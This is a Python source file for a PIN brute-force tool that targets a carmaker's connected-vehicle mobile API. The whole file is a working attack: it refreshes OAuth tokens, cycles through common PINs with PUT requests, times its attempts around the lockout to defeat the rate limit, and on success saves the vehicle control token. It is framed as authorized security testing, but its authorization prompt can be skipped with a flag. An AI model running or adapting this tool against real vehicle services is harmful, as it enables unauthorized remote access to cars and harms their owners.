#!/usr/bin/env python3
"""
Automotive Connect PIN Brute-Force Security Testing Tool
CNR IIT Department - Authorized Use Only

This tool performs automated PIN brute-force testing on a carmaker's mobile API
for authorized security assessments. It implements evidence-grade logging,
rate limiting compliance, and professional reporting standards.

WARNING: Unauthorized use is ILLEGAL. Use only with written authorization.
"""

import argparse
import base64
import hashlib
import json
import os
import signal
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    import requests
    from colorama import Fore, Style, init
    import urllib3
except ImportError as e:
    print(f"❌ Missing required dependency: {e}")
    print("   Install with: pip3 install -r requirements.txt")
    sys.exit(1)

# Initialize colorama for cross-platform color support
init(autoreset=True)

# Disable SSL warnings when verify=False (intentional for Burp proxy)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Script version
VERSION = "1.0.0"

# Global state for signal handler
current_log_file = None
stats = {
    'start_time': None,
    'end_time': None,
    'total_attempts': 0
}

# PIN list now loaded from external file (see config/common_pins.txt)


def signal_handler(signum, frame):
    """Handle SIGINT (Ctrl+C) gracefully"""
    print(f"\n\n{Fore.YELLOW}⚠️  Interrupt received (Ctrl+C){Style.RESET_ALL}")
    print("   Shutting down gracefully...")

    if current_log_file:
        print(f"   Evidence saved to: {Fore.CYAN}{current_log_file}{Style.RESET_ALL}")
        print(f"   To resume: {Fore.GREEN}python3 pin_bruteforce.py --resume {current_log_file}{Style.RESET_ALL}")

    print("   Goodbye!\n")
    sys.exit(0)


# Register signal handler
signal.signal(signal.SIGINT, signal_handler)


def load_config(config_path):
    """Load and parse configuration from JSON file"""
    config_path = Path(config_path)

    if not config_path.exists():
        print(f"{Fore.RED}❌ Config file not found: {config_path}{Style.RESET_ALL}")
        print(f"   Create one from the example: config/bruteforce_config.example.json")
        sys.exit(1)

    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        return config
    except json.JSONDecodeError as e:
        print(f"{Fore.RED}❌ Invalid JSON in config file: {e}{Style.RESET_ALL}")
        sys.exit(1)


def validate_config(config):
    """
    Validate that all required configuration fields are present and valid.

    Required fields (token management - simplified):
      - authorization_basic: Base64-encoded client credentials
      - refresh_token: OAuth2 refresh token
      - device_id: CCSP device identifier

    Optional fields (will be included in headers if present):
      - stamp, client_id, vehicle_id
    """
    required_fields = [
        ('api', 'endpoint'),
        ('api', 'service_id'),
        ('api', 'application_id'),
        ('auth', 'authorization_basic'),
        ('auth', 'refresh_token'),
        ('auth', 'device_id'),
        ('burp', 'proxy_url'),
        ('testing', 'pin_file'),
        ('testing', 'token_refresh_endpoint'),
        ('testing', 'max_attempts_per_cycle'),
        ('testing', 'lockout_duration_seconds'),
        ('logging', 'evidence_dir')
    ]

    for *path, field in required_fields:
        current = config
        for key in path:
            if key not in current:
                print(f"{Fore.RED}❌ Missing config section: {key}{Style.RESET_ALL}")
                sys.exit(1)
            current = current[key]

        if field not in current:
            print(f"{Fore.RED}❌ Missing config field: {'.'.join(path)}.{field}{Style.RESET_ALL}")
            sys.exit(1)

        # Check for placeholder values
        if isinstance(current[field], str):
            if not current[field] or "YOUR_" in current[field].upper():
                print(f"{Fore.RED}❌ Config field not set: {'.'.join(path)}.{field}{Style.RESET_ALL}")
                sys.exit(1)

    # Validate authorization_basic is valid base64
    try:
        auth_basic = config['auth']['authorization_basic']
        decoded = base64.b64decode(auth_basic).decode('utf-8')
        if ':' not in decoded:
            raise ValueError("Must be in format client_id:client_secret")
    except Exception as e:
        print(f"{Fore.RED}❌ Invalid authorization_basic: {e}{Style.RESET_ALL}")
        sys.exit(1)

    # Validate PIN file exists and is readable
    pin_file = config['testing']['pin_file']
    if not os.path.exists(pin_file):
        print(f"{Fore.RED}❌ PIN file not found: {pin_file}{Style.RESET_ALL}")
        sys.exit(1)

    # Try to load at least one PIN from file
    try:
        with open(pin_file, 'r') as f:
            valid_pins = [line.strip() for line in f if line.strip() and not line.startswith('#') and len(line.strip()) == 4 and line.strip().isdigit()]
            if not valid_pins:
                print(f"{Fore.RED}❌ No valid PINs found in {pin_file}{Style.RESET_ALL}")
                sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}❌ Error reading PIN file: {e}{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.GREEN}✅ Configuration validated{Style.RESET_ALL}\n")


def load_pins_from_file(file_path):
    """
    Load PINs from external file with comment support and validation.

    Format:
      - One PIN per line
      - Lines starting with # are comments (ignored)
      - Blank lines are ignored
      - Validates 4-digit numeric format
      - Warns about invalid entries but continues with valid ones

    Args:
        file_path (str): Path to PIN file (relative or absolute)

    Returns:
        list: List of valid PIN strings (deduplicated, order preserved)

    Raises:
        FileNotFoundError: If file doesn't exist
        ValueError: If file contains no valid PINs
    """
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"PIN file not found: {file_path}")

    pins = []
    invalid_entries = []

    with open(file_path, 'r') as f:
        for line_num, line in enumerate(f, 1):
            # Strip whitespace
            line = line.strip()

            # Skip comments and blank lines
            if not line or line.startswith('#'):
                continue

            # Validate PIN format (4 digits, numeric only)
            if len(line) == 4 and line.isdigit():
                pins.append(line)
            else:
                invalid_entries.append((line_num, line))

    # Warn about invalid entries
    if invalid_entries:
        print(f"{Fore.YELLOW}⚠️  Warning: Found {len(invalid_entries)} invalid PIN entries:{Style.RESET_ALL}")
        for line_num, entry in invalid_entries[:5]:  # Show first 5
            print(f"{Fore.YELLOW}   Line {line_num}: '{entry}' (not 4 digits){Style.RESET_ALL}")
        if len(invalid_entries) > 5:
            print(f"{Fore.YELLOW}   ... and {len(invalid_entries) - 5} more{Style.RESET_ALL}")

    # Remove duplicates while preserving order
    pins = list(dict.fromkeys(pins))

    if not pins:
        raise ValueError(f"No valid PINs found in {file_path}")

    print(f"{Fore.GREEN}✅ Loaded {len(pins)} valid PINs from {file_path}{Style.RESET_ALL}")
    return pins


class TokenManager:
    """Track token lifecycle and trigger proactive refresh"""

    def __init__(self, token_lifetime=3600):
        """
        Initialize token manager.

        Args:
            token_lifetime (int): Token validity period in seconds (default: 3600)
        """
        self.token_obtained_at = None
        self.token_lifetime = token_lifetime
        self.refresh_threshold = token_lifetime - 300  # Refresh 5 minutes before expiry

    def mark_token_refreshed(self):
        """Record timestamp when token was last obtained"""
        self.token_obtained_at = datetime.now(timezone.utc)

    def should_refresh(self):
        """
        Check if token should be proactively refreshed.

        Returns:
            bool: True if token should be refreshed (no token yet or nearing expiry)
        """
        if not self.token_obtained_at:
            return True  # No token obtained yet

        age_seconds = (datetime.now(timezone.utc) - self.token_obtained_at).total_seconds()
        return age_seconds >= self.refresh_threshold

    def get_remaining_time(self):
        """
        Get remaining token validity in seconds.

        Returns:
            int: Seconds remaining, or 0 if no token
        """
        if not self.token_obtained_at:
            return 0

        age_seconds = (datetime.now(timezone.utc) - self.token_obtained_at).total_seconds()
        remaining = self.token_lifetime - age_seconds
        return max(0, int(remaining))


def refresh_bearer_token(config, session):
    """
    Obtain new bearer token using refresh_token.

    Uses simplified IDP endpoint that only requires:
      - Authorization Basic header (client_id:client_secret)
      - refresh_token parameter

    Endpoint:
      POST https://idpconnect.host.com/auth/api/v2/user/oauth2/token

    Args:
        config (dict): Configuration dictionary with auth section
        session (requests.Session): HTTP session (for proxy routing)

    Returns:
        str: New bearer token (valid for 3600 seconds)

    Raises:
        Exception: If token refresh fails (network error, auth failure, etc.)
    """
    endpoint = config['testing']['token_refresh_endpoint']

    # Decode Authorization Basic to extract client_id and client_secret
    auth_basic = config['auth']['authorization_basic']
    try:
        decoded = base64.b64decode(auth_basic).decode('utf-8')
        client_id, client_secret = decoded.split(':', 1)
    except Exception as e:
        raise Exception(f"Invalid authorization_basic format: {e}")

    # Build request headers (minimal - only Stamp and Content-Type needed)
    headers = {
        "Host": "idpconnect.host.com",
        "Stamp": "false",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "okhttp/4.10.0"
    }

    # Build request body (form-encoded)
    body = {
        "grant_type": "refresh_token",
        "refresh_token": config['auth']['refresh_token'],
        "client_id": client_id,
        "client_secret": client_secret
    }

    # Send token refresh request
    try:
        response = session.post(endpoint, headers=headers, data=body, timeout=30)
        response.raise_for_status()  # Raise exception for 4xx/5xx status codes

        # Parse response JSON
        token_data = response.json()

        # Extract access_token
        if 'access_token' not in token_data:
            raise Exception(f"No access_token in response: {token_data}")

        return token_data['access_token']

    except requests.exceptions.RequestException as e:
        raise Exception(f"Token refresh request failed: {e}")
    except json.JSONDecodeError as e:
        raise Exception(f"Invalid JSON response from token endpoint: {e}")


def create_session(proxy_url, verify_ssl):
    """Create persistent HTTP session with Burp proxy configuration"""
    session = requests.Session()
    session.proxies = {
        'http': proxy_url,
        'https': proxy_url
    }
    session.verify = verify_ssl
    return session


def build_headers(config):
    """
    Build HTTP headers for carmaker API.

    Required headers:
      - Authorization (Bearer token - auto-obtained from refresh_token)
      - Ccsp-Device-Id (from config)

    Optional headers (included if present in config):
      - Stamp, Clientid, Vehicleid
    """
    headers = {
        "Host": "prd.eu-ccapi.host.com:8080",
        "Ccsp-Service-Id": config['api']['service_id'],
        "Offset": "1",
        "Authorization": f"Bearer {config['auth']['bearer_token']}",
        "Ccsp-Device-Id": config['auth']['device_id'],
        "Ccsp-Application-Id": config['api']['application_id'],
        "Ccuccs2protocolsupport": "0",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "okhttp/4.10.0",
        "Connection": "keep-alive"
    }

    # Add optional headers if present in config and not empty
    if 'stamp' in config['auth'] and config['auth']['stamp']:
        headers['Stamp'] = config['auth']['stamp']

    if 'client_id' in config['auth'] and config['auth']['client_id']:
        headers['Clientid'] = config['auth']['client_id']

    if 'vehicle_id' in config['auth'] and config['auth']['vehicle_id']:
        headers['Vehicleid'] = config['auth']['vehicle_id']

    return headers


def test_pin(pin, config, session):
    """Test a single PIN and return structured result"""
    url = config['api']['endpoint']
    headers = build_headers(config)
    body = {
        "pin": pin,
        "deviceId": config['auth']['device_id']
    }

    start_time = time.time()

    try:
        response = session.put(
            url,
            headers=headers,
            json=body,
            timeout=30
        )

        response_time_ms = (time.time() - start_time) * 1000

        try:
            response_body = response.json()
        except:
            response_body = {}

        return {
            "pin": pin,
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": response_body,
            "response_time_ms": response_time_ms,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "error": None
        }

    except requests.exceptions.Timeout:
        return {
            "pin": pin,
            "error": "timeout",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    except requests.exceptions.ConnectionError as e:
        return {
            "pin": pin,
            "error": f"connection_error: {str(e)}",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    except Exception as e:
        return {
            "pin": pin,
            "error": f"unexpected_error: {str(e)}",
            "timestamp": datetime.now(timezone.utc).isoformat()
        }


def test_pin_with_retry(pin, config, session, max_retries=1):
    """Test PIN with retry on network errors"""
    for attempt in range(max_retries + 1):
        result = test_pin(pin, config, session)

        # If no error, return immediately
        if not result.get('error'):
            return result

        # If timeout or connection error, retry once
        if 'timeout' in result['error'] or 'connection_error' in result['error']:
            if attempt < max_retries:
                print(f"{Fore.YELLOW}   ⚠️  Network error, retrying... (attempt {attempt + 2}/{max_retries + 1}){Style.RESET_ALL}")
                time.sleep(2)
                continue

        # Otherwise, return error result
        return result

    return result


def wait_lockout_period(duration_seconds, safety_buffer=5):
    """Wait for rate limit lockout with visual countdown timer"""
    total_wait = duration_seconds + safety_buffer

    print(f"\n{Fore.YELLOW}⏸️  RATE LIMIT REACHED - Waiting for lockout to expire{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏰ Total wait time: {total_wait} seconds ({total_wait//60}m {total_wait%60}s){Style.RESET_ALL}")

    for remaining in range(total_wait, 0, -1):
        mins, secs = divmod(remaining, 60)
        print(f"{Fore.MAGENTA}   Time remaining: {mins:02d}:{secs:02d}{Style.RESET_ALL}", end='\r', flush=True)
        time.sleep(1)

    print(f"\n{Fore.GREEN}✅ Lockout period complete. Resuming tests...{Style.RESET_ALL}\n")


def parse_api_response(result):
    """Extract key information from API response"""
    if result.get('error'):
        return {
            'success': False,
            'error': result['error'],
            'remain_count': None,
            'control_token': None
        }

    status = result['status_code']
    body = result.get('body', {})

    if status == 200:
        # Success! Got control token
        return {
            'success': True,
            'control_token': body.get('controlToken'),
            'expires_in': body.get('expiresTime'),
            'remain_count': None
        }

    elif status == 400:
        # Incorrect PIN
        err_body = body.get('errBody', {})
        return {
            'success': False,
            'error': 'incorrect_pin',
            'remain_count': err_body.get('remainCount'),
            'remain_time': err_body.get('remainTime')
        }

    elif status == 401:
        # Token expired
        return {
            'success': False,
            'error': 'token_expired',
            'remain_count': None
        }

    else:
        # Unknown error
        return {
            'success': False,
            'error': f'http_{status}',
            'remain_count': None
        }


def print_startup_banner():
    """Display startup banner"""
    print(Fore.CYAN + "╔" + "═" * 58 + "╗")
    print(Fore.CYAN + "║" + Fore.WHITE + "  Automotive Connect PIN Brute-Force Security Testing Tool      " + Fore.CYAN + "║")
    print(Fore.CYAN + "║" + Fore.YELLOW + "  CNR Automotive Security Research - Authorized Use Only " + Fore.CYAN + "║")
    print(Fore.CYAN + "╚" + "═" * 58 + "╝\n")


def print_test_info(config, total_pins):
    """Display test configuration information"""
    vehicle_id_short = config['auth']['vehicle_id'][:20] + "..." if len(config['auth']['vehicle_id']) > 20 else config['auth']['vehicle_id']

    print("Target Configuration:")
    print(f"├─ API Endpoint: prd.eu-ccapi.host.com:8080")
    print(f"├─ Vehicle ID: {vehicle_id_short}")
    print(f"├─ Strategy: Common PINs first (top {total_pins})")
    print(f"├─ Rate Limit: 5 attempts per 300 seconds")
    print(f"└─ Estimated Duration: ~{total_pins * 60 / 3600:.1f} hours\n")


def update_progress(attempt_num, total, pin, status_code, remain_count):
    """Update progress display with colors"""
    progress_pct = (attempt_num / total) * 100

    status_color = Fore.GREEN if status_code == 200 else Fore.RED
    status_emoji = "✅" if status_code == 200 else "❌"

    print(f"{Fore.CYAN}[{attempt_num}/{total}] {Fore.WHITE}Testing PIN: {Fore.YELLOW}{pin} "
          f"{status_color}→ {status_emoji} {status_code}", end="")

    if remain_count is not None:
        print(f" {Fore.MAGENTA}(remainCount: {remain_count}){Style.RESET_ALL}")
    else:
        print(Style.RESET_ALL)


def compute_sha256(data):
    """Compute SHA-256 hash of data (handles str, bytes, or dict)"""
    if isinstance(data, dict):
        data = json.dumps(data, sort_keys=True)
    if isinstance(data, str):
        data = data.encode()
    return hashlib.sha256(data).hexdigest()


def init_evidence_log(config):
    """Initialize evidence log file with header"""
    evidence_dir = Path(config['logging']['evidence_dir'])
    evidence_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    log_file = evidence_dir / f"pin_bruteforce_{timestamp}.log"

    # Write log header (as comments, not part of JSON Lines)
    with open(log_file, 'w') as f:
        f.write(f"# Automotive Connect PIN Brute-Force Evidence Log\n")
        f.write(f"# Generated: {datetime.now(timezone.utc).isoformat()}Z\n")
        f.write(f"# Format: JSON Lines (one JSON object per line)\n\n")

    print(f"{Fore.GREEN}📁 Evidence log: {log_file}{Style.RESET_ALL}\n")
    return log_file


def log_attempt(log_file, attempt_num, cycle_num, result, config):
    """Log single attempt to evidence file (JSON Lines format)"""
    evidence_entry = {
        "metadata": {
            "attempt_number": attempt_num,
            "cycle_number": cycle_num,
            "timestamp_utc": datetime.now(timezone.utc).isoformat(),
            "script_version": VERSION
        },
        "pin": {
            "value": result['pin'],
            "source": config['testing']['pin_file']
        },
        "request": {
            "method": "PUT",
            "url": config['api']['endpoint'],
            "headers": build_headers(config),
            "body": {
                "pin": result['pin'],
                "deviceId": config['auth']['device_id']
            }
        },
        "response": {
            "status_code": result.get('status_code'),
            "headers": result.get('headers', {}),
            "body": result.get('body', {}),
            "response_time_ms": result.get('response_time_ms'),
            "error": result.get('error')
        }
    }

    # Add SHA-256 hashes
    evidence_entry['request']['sha256'] = compute_sha256(evidence_entry['request'])
    evidence_entry['response']['sha256'] = compute_sha256(evidence_entry['response'])

    # Append to log file (JSON Lines format)
    with open(log_file, 'a') as f:
        f.write(json.dumps(evidence_entry) + "\n")


def handle_success(result, log_file):
    """Handle successful PIN discovery"""
    print("\n" + "=" * 60)
    print(f"{Fore.GREEN}✅ SUCCESS! Correct PIN found:{Style.RESET_ALL}")
    print(f"   PIN: {Fore.YELLOW}{result['pin']}{Style.RESET_ALL}")
    print(f"   Control Token: {result['body']['controlToken'][:50]}...")
    print(f"   Expires In: {result['body']['expiresTime']} seconds")
    print(f"   Evidence: {Fore.CYAN}{log_file}{Style.RESET_ALL}")
    print("=" * 60 + "\n")

    # Save control token to file
    token_file = log_file.parent / f"control_token_{result['pin']}.txt"
    with open(token_file, 'w') as f:
        f.write(f"PIN: {result['pin']}\n")
        f.write(f"Control Token: {result['body']['controlToken']}\n")
        f.write(f"Expires: {result['body']['expiresTime']} seconds\n")
        f.write(f"Obtained: {datetime.now(timezone.utc).isoformat()}Z\n")

    print(f"{Fore.GREEN}🔑 Control token saved to: {token_file}{Style.RESET_ALL}\n")
    return True


def handle_token_expiration():
    """Handle Bearer token expiration"""
    print(f"\n{Fore.YELLOW}⚠️  BEARER TOKEN EXPIRED{Style.RESET_ALL}")
    print("   The Bearer token (1-hour lifespan) has expired.")
    print("   To continue testing:")
    print("   1. Obtain a new Bearer token from the carmaker's mobile app")
    print("   2. Update config/bruteforce_config.json")
    print(f"   3. Resume: {Fore.GREEN}python3 pin_bruteforce.py --resume <log_file>{Style.RESET_ALL}")
    print()


def load_resume_state(log_file):
    """Load previously tested PINs from evidence log"""
    tested_pins = set()

    if not Path(log_file).exists():
        print(f"{Fore.RED}❌ Resume log file not found: {log_file}{Style.RESET_ALL}")
        sys.exit(1)

    with open(log_file, 'r') as f:
        for line in f:
            if line.startswith('#'):
                continue  # Skip header comments

            line = line.strip()
            if not line:
                continue

            try:
                entry = json.loads(line)
                tested_pins.add(entry['pin']['value'])
            except json.JSONDecodeError:
                print(f"{Fore.YELLOW}⚠️  Warning: Corrupted log line, skipping{Style.RESET_ALL}")
                continue

    return tested_pins


def filter_untested_pins(all_pins, tested_pins):
    """Return only PINs not yet tested"""
    return [pin for pin in all_pins if pin not in tested_pins]


def test_burp_connection(proxy_url):
    """Test connectivity to Burp proxy"""
    print(f"{Fore.CYAN}🔍 Testing Burp proxy connectivity...{Style.RESET_ALL}")

    try:
        response = requests.get(
            'http://example.com',
            proxies={'http': proxy_url, 'https': proxy_url},
            timeout=5
        )
        print(f"{Fore.GREEN}   ✅ Burp proxy is reachable{Style.RESET_ALL}\n")
        return True
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}   ❌ Cannot connect to Burp proxy{Style.RESET_ALL}")
        print(f"   Please ensure Burp Suite is running on {proxy_url}")
        print("   Also disable 'Intercept' in Burp (Proxy tab)\n")
        return False


def test_api_connectivity(config, session):
    """Test API reachability with known incorrect PIN"""
    print(f"{Fore.CYAN}🔍 Testing API connectivity...{Style.RESET_ALL}")

    test_result = test_pin("0000", config, session)

    if test_result.get('error'):
        print(f"{Fore.RED}   ❌ API unreachable: {test_result['error']}{Style.RESET_ALL}")
        return False

    if test_result['status_code'] in [400, 200]:
        print(f"{Fore.GREEN}   ✅ API is reachable and responding{Style.RESET_ALL}\n")
        return True

    print(f"{Fore.YELLOW}   ⚠️  Unexpected response: {test_result['status_code']}{Style.RESET_ALL}")
    return False


def confirm_authorization(skip_confirmation=False):
    """Require explicit authorization confirmation"""
    if skip_confirmation:
        return True

    print(f"{Fore.RED}⚠️  WARNING: AUTHORIZED USE ONLY{Style.RESET_ALL}")
    print("This tool performs automated PIN brute-forcing on vehicle systems.")
    print("Unauthorized use is ILLEGAL and may violate:\n")
    print("  • Computer Fraud and Abuse Act (CFAA)")
    print("  • Local cybersecurity laws")
    print("  • Carmaker's Terms of Service\n")

    response = input("I have written authorization to test this system (yes/no): ").strip().lower()

    if response != 'yes':
        print(f"\n{Fore.RED}❌ Authorization not confirmed. Exiting.{Style.RESET_ALL}\n")
        sys.exit(1)

    print(f"{Fore.GREEN}✅ Authorization confirmed. Proceeding...{Style.RESET_ALL}\n")
    return True


def generate_manifest(log_file, config, stats_data):
    """Generate evidence manifest file"""
    manifest_file = log_file.parent / "pin_bruteforce_manifest.txt"

    log_hash = compute_sha256(open(log_file, 'rb').read())
    log_size = log_file.stat().st_size

    duration = "Unknown"
    if stats_data['start_time'] and stats_data['end_time']:
        start = datetime.fromisoformat(stats_data['start_time'])
        end = datetime.fromisoformat(stats_data['end_time'])
        delta = end - start
        hours, remainder = divmod(delta.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        duration = f"{hours}h {minutes}m {seconds}s"

    with open(manifest_file, 'w') as f:
        f.write("# PIN Brute-Force Evidence Manifest\n")
        f.write(f"# Generated: {datetime.now(timezone.utc).isoformat()}Z\n\n")

        f.write("## Session Metadata\n")
        f.write(f"Script Version: {VERSION}\n")
        f.write(f"Start Time: {stats_data['start_time']}\n")
        f.write(f"End Time: {stats_data['end_time']}\n")
        f.write(f"Duration: {duration}\n\n")

        f.write("## Configuration\n")
        f.write(f"API Endpoint: {config['api']['endpoint']}\n")
        f.write(f"PIN File: {config['testing']['pin_file']}\n")
        f.write(f"Device ID: {config['auth']['device_id']}\n")
        if 'vehicle_id' in config['auth'] and config['auth']['vehicle_id']:
            f.write(f"Vehicle ID: {config['auth']['vehicle_id']}\n")
        f.write(f"Total PINs Tested: {stats_data['total_attempts']}\n\n")

        f.write("## Evidence Files\n")
        f.write(f"{log_file.name} | SHA-256: {log_hash} | Size: {log_size} bytes\n")

    print(f"{Fore.GREEN}📋 Manifest generated: {manifest_file}{Style.RESET_ALL}")


def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(
        description='Automotive Connect PIN Brute-Force Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 pin_bruteforce.py
  python3 pin_bruteforce.py --resume 1-captures/.../pin_bruteforce_20251028.log
  python3 pin_bruteforce.py --config custom_config.json
        """
    )

    parser.add_argument('--config', default='config/bruteforce_config.json',
                        help='Path to configuration file (default: config/bruteforce_config.json)')
    parser.add_argument('--resume', metavar='LOG_FILE',
                        help='Resume from previous session log file')
    parser.add_argument('--skip-confirmation', action='store_true',
                        help='Skip authorization confirmation (use with caution)')
    parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')

    return parser.parse_args()


def main():
    """Main execution function"""
    global current_log_file, stats

    # Parse arguments
    args = parse_arguments()

    # Print banner
    print_startup_banner()

    # Load and validate configuration
    config = load_config(args.config)
    validate_config(config)

    # Authorization check
    confirm_authorization(args.skip_confirmation)

    # Create HTTP session (needed for token refresh)
    session = create_session(config['burp']['proxy_url'], config['burp'].get('verify_ssl', False))

    # Initialize token manager
    token_manager = TokenManager(token_lifetime=3600)

    # Obtain initial bearer token
    print(f"{Fore.YELLOW}⏳ Obtaining initial bearer token...{Style.RESET_ALL}")
    try:
        bearer_token = refresh_bearer_token(config, session)
        config['auth']['bearer_token'] = bearer_token
        token_manager.mark_token_refreshed()
        print(f"{Fore.GREEN}✅ Bearer token obtained (valid for ~60 minutes){Style.RESET_ALL}\n")
    except Exception as e:
        print(f"{Fore.RED}❌ Failed to obtain bearer token: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Check your refresh_token and authorization_basic in config{Style.RESET_ALL}")
        sys.exit(1)

    # Resume mode or new session
    if args.resume:
        log_file = Path(args.resume)
        tested_pins = load_resume_state(log_file)
        print(f"{Fore.CYAN}📂 Resuming from: {log_file}{Style.RESET_ALL}")
        print(f"   Already tested: {len(tested_pins)} PINs\n")
    else:
        log_file = init_evidence_log(config)
        tested_pins = set()

    current_log_file = log_file

    # Load PIN list from file
    pin_file = config['testing']['pin_file']
    print(f"{Fore.CYAN}📂 Loading PINs from: {pin_file}{Style.RESET_ALL}")
    all_pins = load_pins_from_file(pin_file)
    pins_to_test = filter_untested_pins(all_pins, tested_pins)

    print(f"{Fore.CYAN}🎯 PINs to test: {len(pins_to_test)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 Total PIN list size: {len(all_pins)}{Style.RESET_ALL}\n")

    # Show test configuration
    print_test_info(config, len(all_pins))

    # Pre-flight checks
    if not test_burp_connection(config['burp']['proxy_url']):
        return

    if not test_api_connectivity(config, session):
        return

    # Record start time
    stats['start_time'] = datetime.now(timezone.utc).isoformat()

    # Main brute-force loop
    attempt_num = len(tested_pins) + 1
    cycle_num = 1
    cycle_attempts = 0

    print(f"{Fore.GREEN}🚀 Starting brute-force attack...{Style.RESET_ALL}\n")

    for pin in pins_to_test:
        # Proactive token refresh (at 55 minutes, before 60-minute expiry)
        if token_manager.should_refresh():
            remaining = token_manager.get_remaining_time()
            print(f"\n{Fore.YELLOW}⏳ Token expiring soon ({remaining}s remaining), refreshing...{Style.RESET_ALL}")
            try:
                bearer_token = refresh_bearer_token(config, session)
                config['auth']['bearer_token'] = bearer_token
                token_manager.mark_token_refreshed()
                print(f"{Fore.GREEN}✅ Token refreshed (valid for ~60 minutes){Style.RESET_ALL}\n")
            except Exception as e:
                print(f"{Fore.RED}❌ Token refresh failed: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}⏸️  Pausing execution. Check refresh_token and restart.{Style.RESET_ALL}")
                stats['end_time'] = datetime.now(timezone.utc).isoformat()
                stats['total_attempts'] = attempt_num - 1
                generate_manifest(log_file, config, stats)
                return

        # Test PIN with retry logic
        result = test_pin_with_retry(pin, config, session)

        # Handle 401 Unauthorized (token expired unexpectedly)
        if result.get('status_code') == 401:
            print(f"\n{Fore.YELLOW}⚠️  Token expired (401), refreshing...{Style.RESET_ALL}")
            try:
                bearer_token = refresh_bearer_token(config, session)
                config['auth']['bearer_token'] = bearer_token
                token_manager.mark_token_refreshed()
                print(f"{Fore.GREEN}✅ Token refreshed{Style.RESET_ALL}")

                # Retry the same PIN
                print(f"{Fore.CYAN}🔄 Retrying PIN {pin}...{Style.RESET_ALL}")
                result = test_pin_with_retry(pin, config, session)
            except Exception as e:
                print(f"{Fore.RED}❌ Token refresh failed: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}⏸️  Pausing execution. Check refresh_token and restart.{Style.RESET_ALL}")
                stats['end_time'] = datetime.now(timezone.utc).isoformat()
                stats['total_attempts'] = attempt_num - 1
                generate_manifest(log_file, config, stats)
                return

        # Log attempt
        log_attempt(log_file, attempt_num, cycle_num, result, config)

        # Parse result
        parsed = parse_api_response(result)

        # Display progress
        update_progress(attempt_num, len(all_pins), pin,
                       result.get('status_code', 'ERR'), parsed.get('remain_count'))

        # Handle success
        if parsed.get('success'):
            stats['end_time'] = datetime.now(timezone.utc).isoformat()
            stats['total_attempts'] = attempt_num
            handle_success(result, log_file)
            generate_manifest(log_file, config, stats)
            return

        # Rate limiting
        cycle_attempts += 1
        if cycle_attempts >= config['testing']['max_attempts_per_cycle']:
            wait_lockout_period(
                config['testing']['lockout_duration_seconds'],
                config['testing'].get('safety_buffer_seconds', 5)
            )
            cycle_num += 1
            cycle_attempts = 0

        attempt_num += 1

    # All PINs tested, none successful
    stats['end_time'] = datetime.now(timezone.utc).isoformat()
    stats['total_attempts'] = attempt_num - 1

    print(f"\n{Fore.YELLOW}⚠️  All PINs tested. No match found.{Style.RESET_ALL}")
    print(f"   Total attempts: {stats['total_attempts']}")
    print(f"   Evidence: {Fore.CYAN}{log_file}{Style.RESET_ALL}\n")

    generate_manifest(log_file, config, stats)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        # Signal handler will manage this
        pass
    except Exception as e:
        print(f"\n{Fore.RED}❌ Unexpected error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
